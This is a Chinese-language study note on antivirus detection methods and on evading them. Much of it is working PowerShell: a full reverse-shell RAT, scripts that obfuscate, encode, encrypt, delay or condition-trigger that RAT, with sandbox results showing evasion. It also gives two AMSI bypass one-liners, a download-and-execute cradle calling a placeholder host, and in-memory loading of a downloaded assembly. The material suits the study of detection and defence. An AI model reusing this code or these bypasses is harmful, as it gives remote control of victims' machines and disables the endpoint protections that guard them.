# 杀毒与免杀

---

- [杀毒与免杀](#杀毒与免杀)
  - [木马概述](#木马概述)
    - [木马的定义](#木马的定义)
    - [木马感染的过程](#木马感染的过程)
    - [木马示例](#木马示例)
  - [特征码查杀](#特征码查杀)
    - [加壳](#加壳)
      - [代码混淆](#代码混淆)
      - [编码或加密](#编码或加密)
        - [Base64编码](#base64编码)
        - [自定义加密](#自定义加密)
      - [填充合法的系统命令](#填充合法的系统命令)
      - [利用第三方服务](#利用第三方服务)
      - [时间延迟执行](#时间延迟执行)
      - [分割和分散代码](#分割和分散代码)
  - [启发式分析](#启发式分析)
  - [沙盒分析](#沙盒分析)
  - [行为监测](#行为监测)
    - [AMSI](#amsi)
      - [AMSI Bypass](#amsi-bypass)
      - [改注册表禁用 AMSI](#改注册表禁用-amsi)
      - [通过命名空间接口关闭AMSI](#通过命名空间接口关闭amsi)
    - [时间延迟执行](#时间延迟执行-1)
    - [条件触发](#条件触发)
    - [行为免杀](#行为免杀)
    - [使用冷门方法实现](#使用冷门方法实现)
    - [拷贝重命名 powershell](#拷贝重命名-powershell)
  - [云基础分析](#云基础分析)
  - [AI分析](#ai分析)

---

> [相爱相杀：杀毒软件6种主流的查杀原理 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/others-articles/336601.html)

---

可以使用 [VirusTotal - Home --- VirusTotal - 主页](https://www.virustotal.com/gui/home/upload) 来判断文件是否为病毒文件

![image-20231228021206407](http://cdn.ayusummer233.top/DailyNotes/202312280212445.png)

---

## 木马概述

### 木马的定义

木马是一种隐藏在看似合法软件中的恶意软件，它在用户不知情的情况下执行未授权的活动。这种名称来源于古希腊的特洛伊木马故事，象征着通过欺骗手段渗透和破坏。

与病毒和蠕虫不同

- 木马将自己伪装成合法的软件或文件, 欺骗用户主动执行它
- 病毒能够自我复制并插入其他程序中, 需要宿主文件来复制和传播
- 蠕虫不需要宿主文件, 可以自我复制和传播, 它们的主要目的是尽可能地复制和传播自身

---

### 木马感染的过程

木马通常通过伪装成合法软件或附件来诱骗用户下载和执行。一旦激活，它们可以执行各种恶意活动，如窃取数据、监控用户活动或创建后门

> 钓鱼邮件, WallpaperEngine投毒

---

### 木马示例

远程访问木马(RAT - Remote Access Trojan) 是一种允许攻击者远程控制受感染计算机的恶意软件

传统的防火墙设计通常认为出站连接(由内部网络向外部网络发起的连接)是安全的, 而外部对内部网络的直接访问可能是危险的; RAT 通常使用反向连接使得受感染主机主动连接攻击者服务器来绕过防火墙在这方面的防护

可以使用 PowerShell 实现

```powershell
# 创建一个 TCP 客户端对象, 尝试连接到 192.168.159.1 的 4444 端口
$client = New-Object System.Net.Sockets.TCPClient("192.168.159.1", 4444);
# 从 TCP 客户端对象中获取流对象, 用于接收和发送数据
$stream = $client.GetStream();
# 创建一个64KB的字节数组, 用于接收数据(每个字节都是0)
[byte[]]$bytes = 0..65535 | % { 0 };

# 持续从网络流中读取数据
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # 将字节数组转换为字符串
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    # 执行字符串中的命令, 并将结果转换为字符串
    $sendback = (iex $data 2>&1 | Out-String );
    # 将执行结果和一个提示符附加到输出中
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    # 将输出字符串转换为字节
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    # 将字节写入网络流中
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    # 刷新网络流
    $stream.Flush();
}
# 在完成通信后关闭TCP连接
$client.Close();

```
- `[byte[]]$bytes = 0..65535 | % { 0 }`
  - `0..65535`: 创建了一个包含从0到65535的整数序列
  - `% { 0 }`: PowerShell中的ForEach-Object命令的简短写法  
    对序列中的每个元素执行括号内的操作(返回0)
- `$sendback = (iex $data 2>&1 | Out-String )`
  - `2>&1`: 在PowerShell中，2 表示标准错误流（stderr），1 表示标准输出流（stdout）  
    `2>&1` 表示将标准错误流重定向到标准输出流, 这意味着命令的输出和错误都会被捕获并重定向为字符串到 `$sendback`
- `$stream.Write($sendbyte,0,$sendbyte.Length)`
  - `Write` 是 `System.Net.Sockets.NetworkStream` 对象的一个方法，用于将数据写入网络流;   
    这个方法需要三个参数：`要写入的字节数据`, `字节数组中开始写入数据的位置`, `要写入的字节数量`

![image-20240102015739253](http://cdn.ayusummer233.top/DailyNotes/202401020157367.png)

![image-20240102015956053](http://cdn.ayusummer233.top/DailyNotes/202401020159078.png)

![image-20240102025931311](http://cdn.ayusummer233.top/DailyNotes/202401020259436.png)

![image-20240102015917847](http://cdn.ayusummer233.top/DailyNotes/202401020159890.png)

> 360 的离线查杀似乎不太好用

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/f403aea15df24095b3270a5572191f77a02664b7b0792e8f2d229a5a4895a1b5)

![image-20240115174529326](http://cdn.ayusummer233.top/DailyNotes/202401151745427.png)


---

## 特征码查杀

![1.png](http://cdn.ayusummer233.top/DailyNotes/202312280115873.jpeg)

杀软公司通过各种毒经获得病毒样本并确认为病毒后会提取这个病毒文件的特征码用于唯一标识这个文件

例如最简单的文件哈希, 或是文件中唯一存在的一段字符串

这种方式可以用来防范一些已知的恶意软件,病毒文件

----

以查杀上述 RAT 示例为例, 如果这是一个比较知名的木马, 那么首先可以检查其哈希来匹配已知的木马哈希

除此以外, 可以看到这个示例中的RAT使用了一些特定的PowerShell命令和结构，这些可以被用来创建特征码

例如: 

-  `New-Object System.Net.Sockets.TCPClient` 用于建立网络连接, 特别是当它连接到一个固定的IP地址端口时
- `iex`（Invoke-Expression的缩写）用于执行字符串中的命令, 尤其是当它与网络功能结合使用时

那么可以创建一个特征码, 用于检测包含 `New-Object System.Net.Sockets.TCPClient` 和 `iex` 命令组合的脚本

---

### 加壳

![2.png](http://cdn.ayusummer233.top/DailyNotes/202312280124792.jpeg)

由于基于特征码的查杀依赖于匹配恶意软件的已知特征码或签名, 因此如果将恶意软件的代码进行加密混淆("加壳"), 然后执行的时候进行动态的解密("解壳")就可以绕过这种基于特征码的静态分析

---

#### 代码混淆

- 攻击者可以使用混淆技术来改变脚本的外观，使其特征码不再匹配

- 例如，使用不寻常的变量名、分解字符串、动态构造命令等方法

---

以 `字符串拆分与重组` 为例

PowerShell允许动态构造并执行字符串形式的命令，即使命令被拆分成多个部分，它们仍然可以被重新组合并执行; 

例如:

```powershell
Invoke-Expression "whoami"
```

![image-20240102022636132](http://cdn.ayusummer233.top/DailyNotes/202401020226149.png)

```powershell
$p1 = "who"
$p2 = "ami"
$cmd = $p1 + $p2
Invoke-Expression $cmd
```

![image-20240102022842255](http://cdn.ayusummer233.top/DailyNotes/202401020228304.png)

举个极端例子, 可以将原始脚本中的命令逐个字符进行切分然后拼接后使用 IEX 执行:

```powershell
# 使用PowerShell读取 RATSample.ps1 文件中的内容
$originalScript = Get-Content -Path "../../RATSample.ps1"
# 将脚本中的每个字符分解为单独的元素
$splitScript = $originalScript.ToCharArray()
# 遍历每个字符，创建一个将这些字符重新组合的脚本
$obfuscatedScript = ""
$counter = 1
foreach ($char in $splitScript) {
    $varName = "var" + $counter
    $obfuscatedScript += "`$$varName = '$char'; "
    $counter++
}
$obfuscatedScript += "`$cmd = "
for ($i = 1; $i -lt $counter; $i++) {
    $obfuscatedScript += "`$var$i + "
}
$obfuscatedScript = $obfuscatedScript.TrimEnd(" + ") + "; iex `$cmd"
# 将生成的混淆脚本写入到一个新文件
$obfuscatedScript | Out-File -FilePath "Obfuscated_RAT.ps1"

```

![image-20240102023733691](http://cdn.ayusummer233.top/DailyNotes/202401020237725.png)

![image-20240102023841467](http://cdn.ayusummer233.top/DailyNotes/202401020238563.png)

![image-20240102023922769](http://cdn.ayusummer233.top/DailyNotes/202401020239799.png)

![image-20240102024101569](http://cdn.ayusummer233.top/DailyNotes/202401020241601.png)

![image-20240102024318383](http://cdn.ayusummer233.top/DailyNotes/202401020243445.png)

---

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/7b59dc64c8410f955e918f886ebcc066ce2eddeb76737b893e82988c83c34307)

![image-20240115174645870](http://cdn.ayusummer233.top/DailyNotes/202401151746203.png)


---

#### 编码或加密

- 将脚本或其关键部分进行编码或加密，以避免被基于文本匹配的特征码检测。

- 在运行时对这些部分进行解码或解密，执行原始的恶意操作。

---

##### Base64编码

例如将整个 RATSample 进行 Base64 编码然后执行

```powershell
# 读取原始RAT脚本
$originalScript = Get-Content -Path "../../RATSample.ps1" -Raw

# 将脚本转换为Base64编码
$encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($originalScript))

# 准备新脚本的内容，该脚本将解码并执行原始脚本
$decodedExecuteScript = @"
`$decodedScript = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$encodedScript'))
Invoke-Expression `$decodedScript
"@

# 将新脚本内容写入文件
$decodedExecuteScript | Out-File -FilePath "EncodedRAT.ps1"

```

![image-20240102030956575](http://cdn.ayusummer233.top/DailyNotes/202401020309607.png)

![image-20240102031203051](http://cdn.ayusummer233.top/DailyNotes/202401020312126.png)

![image-20240102031520703](http://cdn.ayusummer233.top/DailyNotes/202401020315790.png)

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/e1910e688ccdce21396cfc2d44012ac4520dc6c6a2508c8dd14948e3e0411ac0)

![image-20240115180448559](http://cdn.ayusummer233.top/DailyNotes/202401151804395.png)

---

##### 自定义加密

攻击者可以自定义加解密方案, 例如读取 RATSample.ps1, 将其中所有字符的 ASCII 码 +1 然后补齐 3 位生成一串加密指令然后对应解码执行

```powershell
$originalScript = Get-Content -Path "../../RATSample.ps1" -Raw
Write-Host $originalScript
$encryptedScript = ($originalScript.ToCharArray() | ForEach-Object {
    $asciiValue = [int][char]$_ + 1
    $asciiValue.ToString("D3")
}) -join ''
$decryptionScript = @"
`$encryptedScript = '$encryptedScript'
`$decryptedScript = ''
for (`$i = 0; `$i -lt `$encryptedScript.Length; `$i+=3) {
    `$asciiValue = [int]::Parse(`$encryptedScript.Substring(`$i, 3)) - 1
    `$decryptedScript += [char]`$asciiValue
}
Invoke-Expression `$decryptedScript
"@

$decryptionScript | Out-File -FilePath "EncryptedRAT.ps1"
```

![image-20240102033515761](http://cdn.ayusummer233.top/DailyNotes/202401020335834.png)

![image-20240102034136813](http://cdn.ayusummer233.top/DailyNotes/202401020341871.png)

---

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/4673839b2e1403c7c1cad50913517f3e9e7d3e4491da36cebac882051a0ba749)

![image-20240115181202403](http://cdn.ayusummer233.top/DailyNotes/202401151812539.png)

---

#### 填充合法的系统命令

和填充脏数据差不多的意思, 通过填充大量合法指令来混淆视听, 例如

```powershell
$repeatedCommands = @(
    "'Get-Host'",
    "'Get-Date'",
    "'Get-Service'",
    "'Get-Process'",
    "'Get-EventLog -LogName System'"
) * 100 # 重复100次
$originalScript = Get-Content -Path "../RATSample.ps1" -Raw
$obfuscatedScript = $repeatedCommands + $originalScript + $repeatedCommands
$obfuscatedScript -join "`n" | Out-File -FilePath "ObfuscatedRAT.ps1"
```

![image-20240102041132197](http://cdn.ayusummer233.top/DailyNotes/202401020411240.png)

![image-20240102041117645](http://cdn.ayusummer233.top/DailyNotes/202401020411712.png)

![image-20240102040837354](http://cdn.ayusummer233.top/DailyNotes/202401020408407.png)

---

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/09a7291d125fc95428ce138099d84806702e6d77c8e8e2e4fa429769adcb8893)

微步标了个可疑

![image-20240115181311714](http://cdn.ayusummer233.top/DailyNotes/202401151813457.png)

---

#### 利用第三方服务

使用合法的第三方服务作为C&C（命令和控制）通信，比如社交媒体、合法的云服务等，以隐藏恶意流量。

---

#### 时间延迟执行

- 在脚本中加入延迟执行的代码，使恶意行为不会立即发生，这样在静态分析时看起来不会有恶意行为。

---

#### 分割和分散代码

- 将恶意功能分割成多个看似无害的部分，分别嵌入到不同的脚本或程序中，在特定条件下才组合执行。

---

## 启发式分析

启发式分析是一种相较于特征码查杀更先进的`静态`检测方法, 可以用来识别尚未知晓的病毒或变种

它通过分析程序的行为和代码结构来预测其潜在恶意性

如果一个程序的行为类似已知的恶意软件, 或者试图执行可疑的操作(如修改重要的系统文件), 那么就可以标记其为潜在的威胁

![5.png](http://cdn.ayusummer233.top/DailyNotes/202312280201628.jpeg)

静态启发式分析指的实在静止状态下通过对病毒的典型指令特征识别病毒的方法, 是对传统特征码扫描的补充

在不运行病毒木马的情况下, 进行简单的反汇编, 查找, 匹配是否出现病毒木马指定的指令或者 API 函数调用序列来分析该文件是否为病毒

---

## 沙盒分析

杀软会在一个隔离的环境(沙盒)中运行程序

这允许软件观察程序的行为而不影响实际的操作系统或文件

如果程序在沙盒中表现出恶意行为, 杀毒软件会将其识别为威胁

![6.png](http://cdn.ayusummer233.top/DailyNotes/202312280206229.jpeg)

动态启发式通过杀软内置的虚拟机技术，给病毒构建一个仿真的运行环境，诱使病毒在杀软的模拟缓冲区中运行，运行过程中监控程序的行为。这种方法能够全面、有效地采集程序行为，从而综合判断程序是否是病毒

---

## 行为监测

杀软会监控系统上的活动, 寻找与恶意软件行为相似的模式; 例如大量访问个人数据可能会触发警报

![3.png](http://cdn.ayusummer233.top/DailyNotes/202312280155209.jpeg)

或者说, 当病毒木马加载到内存后, 脱去外壳, 还原为真实的数据, 此时杀软再对内存中的数据进行查杀, 匹配特征

> 和前面的启发式分析中提到的关注程序的行为需要区分
>
> - `启发式分析` 仍旧是一种静态的检测方式, 主要针对程序的代码和结构进行分析, 寻找其和已知恶意软件相似的特征
> - `行为监测` 则是动态的检测手段, 它会检测程序执行时的具体行为, 如系统调用、文件访问等，来检测恶意活动

---

行为监测可以有效针对木马加壳行为, 例如上述 `RATSample.ps1` 的各种加壳变种加载到内存后最后都执行的 RATSample 中一样的代码, 可以有效回归原本的检测手段, 例如检测包含 `New-Object System.Net.Sockets.TCPClient` 和 `iex` 命令组合的行为

---

### AMSI

> [amsi绕过总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11097)

AMSI（Antimalware Scan Interface）是微软提供的一个标准化接口，旨在增强恶意软件和其他威胁的检测能力，特别是对于那些运行在Windows操作系统上的脚本和解释型代码

> Win10 以及 WindowsSever2016 及之后的版本支持 AMSI 
>
> 低版本(2.0)的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到
>
> ![image-20240102052708985](http://cdn.ayusummer233.top/DailyNotes/202401020527019.png)

AMSI使得应用程序（如PowerShell、VBScript、JavaScript等）可以将执行前的代码发送到安装的防病毒软件进行扫描

----

#### AMSI Bypass

通过修改内存中的AMSI相关数据，或者利用AMSI实现中的漏洞可以实现 bypass AMSI 从而缓解检测

---

#### 改注册表禁用 AMSI

设置注册表`HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable`设置为 0，以禁用
AMSI。

```powershell
Remove-Item -Path "HKLM:\Software\Microsoft\Windows Script\Settings\AmsiEnable" -Recurse
```



---

#### 通过命名空间接口关闭AMSI

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPubilc,Static').SetValue($null,$true)
```

1. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`

   - 获取`System.Management.Automation`命名空间下的`AmsiUtils`类的类型信息。

     `AmsiUtils`是处理AMSI相关操作的内部类。

2. `GetField('amsiInitFailed','NonPublic,Static')`

   - 获取`AmsiUtils`类中名为`amsiInitFailed`的字段。

     这个字段是一个私有（NonPublic）静态（Static）字段，用于指示AMSI是否初始化失败。

3. `SetValue($null,$true)`

   - 将`amsiInitFailed`字段的值设置为`$true`，意味着伪造AMSI初始化失败的状态。

     这样做的效果是使AMSI停止工作，因为系统认为AMSI无法正确初始化。

---

### 时间延迟执行

在脚本中加入延迟执行的代码，使恶意行为不会立即发生，这样在静态分析时看起来不会有恶意行为'

例如结合前面自定义加密的方案以及 `Start-Sleep -Seconds 100  ` 来做时延

```powershell
$originalScript = Get-Content -Path "../../RATSample.ps1" -Raw
Write-Host $originalScript
$encryptedScript = ($originalScript.ToCharArray() | ForEach-Object {
    $asciiValue = [int][char]$_ + 1
    $asciiValue.ToString("D3")
}) -join ''
$decryptionScript = @"
`$encryptedScript = '$encryptedScript'
Start-Sleep -Seconds 100  
`$decryptedScript = ''
for (`$i = 0; `$i -lt `$encryptedScript.Length; `$i+=3) {
    `$asciiValue = [int]::Parse(`$encryptedScript.Substring(`$i, 3)) - 1
    `$decryptedScript += [char]`$asciiValue
}
Start-Sleep -Seconds 100  
Invoke-Expression `$decryptedScript
"@

$decryptionScript | Out-File -FilePath "EncryptedRAT.ps1"
```

[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/da54f8b59c4643f2248c77d1263b98ef036fe7fa9946b0d05b22bbdc72dfc98f)

微步是无检出的

![image-20240115181538678](http://cdn.ayusummer233.top/DailyNotes/202401151815161.png)

---

### 条件触发

设计脚本在满足某些特定条件（如特定的系统配置、日期或用户活动）时才执行恶意操作

例如只有当 word 启动时才执行恶意代码

```powershell
$originalScript = Get-Content -Path "../RATSample.ps1" -Raw
$encryptedScript = ($originalScript.ToCharArray() | ForEach-Object {
        $asciiValue = [int][char]$_ + 1
        $asciiValue.ToString("D3")
    }) -join ''
$decryptionScript = @"
`$wordRunning = `$false
while (-not `$wordRunning) {
    if (Get-Process -Name "WINWORD" -ErrorAction SilentlyContinue) {
        `$wordRunning = `$true
    }else {
        Start-Sleep -Seconds 10
    }
}
`$encryptedScript = '$encryptedScript'
`$decryptedScript = ''
for (`$i = 0; `$i -lt `$encryptedScript.Length; `$i+=3) {
    `$asciiValue = [int]::Parse(`$encryptedScript.Substring(`$i, 3)) - 1
    `$decryptedScript += [char]`$asciiValue
}
Invoke-Expression `$decryptedScript
"@

$decryptionScript | Out-File -FilePath "ConditionTriggeredEncryptedRAT.ps1"

```

---

### 行为免杀

> [远控免杀从入门到实践(6)-代码篇-Powershell - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/227467.html)

```powershell
powershell -NoExit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://xx.x.x/shell.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"
```

> 没感觉到具体用处, 放个 TODO

---

### 使用冷门方法实现

```powershell
$wm = New-Object System.Net.WebClient;
$base64 = $wm.DownloadData("xxx");
# 将下载的数据加载到内存中
$asm = [Reflection.Assembly]::Load($base64);
$asm.EntryPoint.Invoke($null,@());
```
- `.EntryPoint` 是 `System.Reflection.Assembly` 类的一个属性，它指向程序集中的入口点。对于.NET程序来说，这通常是Main方法, 是程序开始执行的地方。
- `.Invoke($null,@())`
  - `($null,@())` 是 `.Invoke` 方法的参数。这里有两个参数：
    - `$null`：表示Invoke方法被调用的对象。因为大多数.NET程序的入口点Main方法是静态的（即它不依赖于类的实例），所以这里使用$null。如果入口点是一个实例方法（非静态），这里将需要一个该类的实例。
    - `@()`：传递给Main方法的参数数组。在这个例子中，使用空数组@()，表示没有参数被传递。如果Main方法期望参数，它们将在这里提供。

---

### 拷贝重命名 powershell

> [Powershell免杀-CSDN博客](https://blog.csdn.net/qq_50854790/article/details/124705800)

```powershell
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.txt
bypass.txt IEX(xxx)
```

> 现在基本上没什么用了

---

## 云基础分析

许多现代杀软使用云技术来提高恶意软件检测的能力

云服务器可以存储大量的病毒信息, 提供实时更新, 并允许快速对新出现的威胁做出反应

当程序出现可疑行为但是不足以确定是病毒木马时, 为了降低误报率, 提升用户体验, 杀软一般会放行, 然后将对应的可疑文件上传到服务器进行分析; 当一个用户设备遇到新型威胁时, 这个信息可以被快速共享给其他用户, 提升整个网络的安全水平

![7.png](http://cdn.ayusummer233.top/DailyNotes/202312280207848.jpeg)



---

## AI分析

杀软公司可以依托自己庞大的病毒样本库训练病毒查杀模型~

![8.png](http://cdn.ayusummer233.top/DailyNotes/202312280210569.jpeg)

---









